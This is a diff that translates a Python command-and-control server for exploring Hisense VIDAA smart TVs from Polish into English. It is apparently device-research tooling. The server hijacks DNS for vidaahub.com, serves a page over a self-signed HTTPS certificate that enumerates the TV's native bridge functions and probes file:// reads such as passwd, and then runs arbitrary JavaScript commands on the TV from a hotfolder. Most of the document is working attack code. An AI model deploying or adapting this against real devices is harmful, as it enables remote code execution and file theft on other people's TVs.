@@ -1,18 +1,18 @@
 #
-# Serwer C&C do eksploracji VIDAA.
-# - DNS (53): vidaahub.com -> PC_IP, reszta -> forward do UPSTREAM
-# - HTTP (80) i HTTPS (443, cert vidaahub.com): strona mostka + /cmd + /res
-# Kontrola: hotfolder cnd/NNN.js -> komenda JS dla TV (wynik -> results.jsonl)
+# C&C server for VIDAA exploration.
+# - DNS (53): vidaahub.com -> PC_IP, everything else forwarded to UPSTREAM
+# - HTTP (80) and HTTPS (443, vidaahub.com cert): bridge page + /cmd + /res
+# Control: hotfolder cnd/NNN.js -> JS command for the TV (results -> results.jsonl)
 #
-# Dostosuj PC_IP i UPSTREAM do swojej sieci.
+# Adjust PC_IP and UPSTREAM to your network.
 # Cert: openssl req -x509 -newkey rsa:2048 -keyout vidaahub.com.key -out vidaahub.com.crt -days 365 -nodes -subj "/CN=vidaahub.com"
 #
 import json, os, socket, socketserver, ssl, sys, threading, time, uuid
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
 
-PC_IP = "192.168.8.136"          # <- IP Twojego PC w LAN
-UPSTREAM = ("192.168.8.1", 53)   # <- router
+PC_IP = "192.168.8.136"          # <- your PC's IP on the LAN
+UPSTREAM = ("192.168.8.1", 53)   # <- your router
 HERE = os.path.dirname(os.path.abspath(__file__))
 
 pending = {"id": None, "js": None, "event": threading.Event()}
@@ -21,22 +21,22 @@ results = []
 PAGE = r"""<!DOCTYPE html><html><head><meta charset="utf-8">
 <title>Vidaa Hub</title></head>
 <body style="background:#000;color:#0f0;font:22px monospace;padding:20px">
-<div id="s">Laczenie z mostkiem Hisense...</div>
+<div id="s">Connecting to Hisense bridge...</div>
 <script>
 var SID = Math.random().toString(36).slice(2,8);
 function say(t){ document.getElementById("s").innerHTML += "<br>"+t; }
 function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;"); }
 
-// 1. enumeracja funkcji mostka
+// 1. enumerate bridge functions
 var bridge = {};
 try {
   var names = Object.getOwnPropertyNames(window);
   var fns = names.filter(function(n){ return /^Hisense_|^HiUtils_|^File|^hi[A-Z]/.test(n); });
-  say("funkcji mostka: " + fns.length);
+  say("bridge functions: " + fns.length);
   fns.forEach(function(n){ bridge[n] = typeof window[n]; });
   say(esc(fns.slice(0,60).join(", ")));
   var syms = Object.getOwnPropertySymbols(window).map(String);
-  say("symbole: " + syms.length + " " + esc(syms.slice(0,20).join(",")));
+  say("symbols: " + syms.length + " " + esc(syms.slice(0,20).join(",")));
 } catch(e){ say("enum err: "+e.message); }
 
 // 2. test XHR file://
@@ -52,7 +52,7 @@ function xhrFile(p){ return new Promise(function(res){ try{
   probes.xhrPasswd = x;
 
   await fetch("/res",{method:"POST",body:JSON.stringify({id:-1, ok:true, result:{sid:SID, bridge:bridge, probes:probes}})});
-  say("probe wyslane, czekam na polecenia...");
+  say("probe sent, waiting for commands...");
 
   while(true){
     try{
@@ -140,11 +140,11 @@ class DNSHandler(socketserver.BaseRequestHandler):
             pass
 
 def console():
+    """Hotfolder: cnd/NNN.js -> command JS for the TV. Results -> results.jsonl."""
     cnd = os.path.join(HERE, "cnd")
     os.makedirs(cnd, exist_ok=True)
     done = os.path.join(cnd, "done"); os.makedirs(done, exist_ok=True)
     resf = open(os.path.join(HERE, "results.jsonl"), "a", encoding="utf-8")
-    shipped = set()
     while True:
         files = sorted(f for f in os.listdir(cnd) if f.endswith(".js"))
         if not files or pending["id"] is not None:
@@ -169,13 +169,13 @@ def main():
         dns = socketserver.ThreadingUDPServer((PC_IP, 53), DNSHandler)
         dns.allow_reuse_address = True
         threading.Thread(target=dns.serve_forever, daemon=True).start()
-        print("[+] DNS na :53", flush=True)
+        print("[+] DNS on :53", flush=True)
     except Exception as e:
         print("[-] DNS 53:", e, flush=True)
     try:
         h = ThreadingHTTPServer((PC_IP, 80), Handler); h.daemon_threads=True
         threading.Thread(target=h.serve_forever, daemon=True).start()
-        print("[+] HTTP na :80", flush=True)
+        print("[+] HTTP on :80", flush=True)
     except Exception as e:
         print("[-] HTTP 80:", e, flush=True)
     try:
@@ -184,10 +184,10 @@ def main():
         ctx.load_cert_chain(certfile=os.path.join(HERE,"vidaahub.com.crt"), keyfile=os.path.join(HERE,"vidaahub.com.key"))
         hs.socket = ctx.wrap_socket(hs.socket, server_side=True)
         threading.Thread(target=hs.serve_forever, daemon=True).start()
-        print("[+] HTTPS na :443", flush=True)
+        print("[+] HTTPS on :443", flush=True)
     except Exception as e:
         print("[-] HTTPS 443:", e, flush=True)
-    print("GOTOWY. Czekam na TV...", flush=True)
+    print("READY. Waiting for the TV...", flush=True)
     while True: time.sleep(1)
 
 if __name__ == "__main__":
